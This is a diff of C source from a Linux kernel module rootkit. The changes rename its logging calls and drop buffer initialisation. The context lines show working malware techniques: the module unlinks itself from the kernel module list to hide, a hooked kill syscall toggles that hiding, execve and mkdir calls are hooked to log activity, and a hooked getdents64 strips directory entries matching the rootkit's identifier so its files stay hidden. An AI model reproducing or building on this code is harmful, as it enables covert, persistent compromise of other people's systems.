@@ -11,12 +11,12 @@ extern int BUFFER_SIZE;
 static int hide_rootkit(void){
 	if (module_hidden){
 		list_add(&THIS_MODULE->list, prev_module); //adds module back into lkm list
-		log("[hooked_syscalls.c::hide_rootkit] rootkit has been revealed\n");
+		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been revealed\n");
 	}
 	else{
 		prev_module = THIS_MODULE->list.prev; //sets the location of the previous module so rootkit can re-insert itself
 		list_del(&THIS_MODULE->list); //deletes this module from the list
-		log("[hooked_syscalls.c::hide_rootkit] rootkit has been hidden\n");
+		log_msg("[hooked_syscalls.c::hide_rootkit] rootkit has been hidden\n");
 	}
 	module_hidden^=1; //flips module_hidden variable
 	return 0;
@@ -52,12 +52,12 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){
 		hide_rootkit();
 		return 0;
 	}
-	log(buffer);
+	log_msg(buffer);
 	return sys_kill.orig_syscall(regs); //kills process and returns result
 }
 
 static asmlinkage long hooked_mkdir(const struct pt_regs *regs){
-	char buffer[BUFFER_SIZE] = {0};
+	char buffer[BUFFER_SIZE];
 	char dir_name[NAME_MAX] = {0};
 	char __user *pathname = (char *)regs->di; //gets name of directory
 	int mode = (int)regs->si; //gets mkdir mode
@@ -69,12 +69,12 @@ static asmlinkage long hooked_mkdir(const struct pt_regs *regs){
 	else{
 		sprintf(buffer, "[hooked_syscalls.c::hooked_mkdir] directory with name unable to be copied created in mode 0x%x\n", mode);
 	}
-	log(buffer);
+	log_msg(buffer);
 	return sys_mkdir.orig_syscall(regs); //executes original syscall
 }
 
 static asmlinkage long hooked_execve(const struct pt_regs *regs){
-	char buffer[BUFFER_SIZE] = {0};
+	char buffer[BUFFER_SIZE];
 	char filename[NAME_MAX] = {0};
 	char __user *filename_user = (char *)regs->di; //gets userspace filename
 
@@ -85,12 +85,12 @@ static asmlinkage long hooked_execve(const struct pt_regs *regs){
 	else{
 		sprintf(buffer, "[hooked_syscalls.c::hooked_execve] unable to copy command- errcode recieved is %i\n", error); //copy message to buffer
 	}
-	log(buffer);
+	log_msg(buffer);
 	return sys_execve.orig_syscall(regs); //executes original syscall
 }
 
 static asmlinkage long hooked_getdents64(const struct pt_regs *regs){
-	char buffer[BUFFER_SIZE]={0};
+	char buffer[BUFFER_SIZE];
 	struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL; //buffer to hold kernelspace dirent
 	struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si; //gets the userspace dirent structure from regs
 	int ret = sys_getdents64.orig_syscall(regs); //gets the directory listing from  original getdents64
@@ -113,7 +113,7 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs){
 
     if ( strstr(current_dir->d_name, ROOTKIT_ID) != NULL){ //Compare the first bytes of current_dir->d_name to rootkit id
 			sprintf(buffer,"[rootkit] getdents64- hiding %s\n", current_dir->d_name);
-			log(buffer);
+			log_msg(buffer);
 
 			if (current_dir==dirent_ker){ //if special case where fisrt entry needs to be hidden
 				ret -= current_dir->d_reclen; //decrements ret
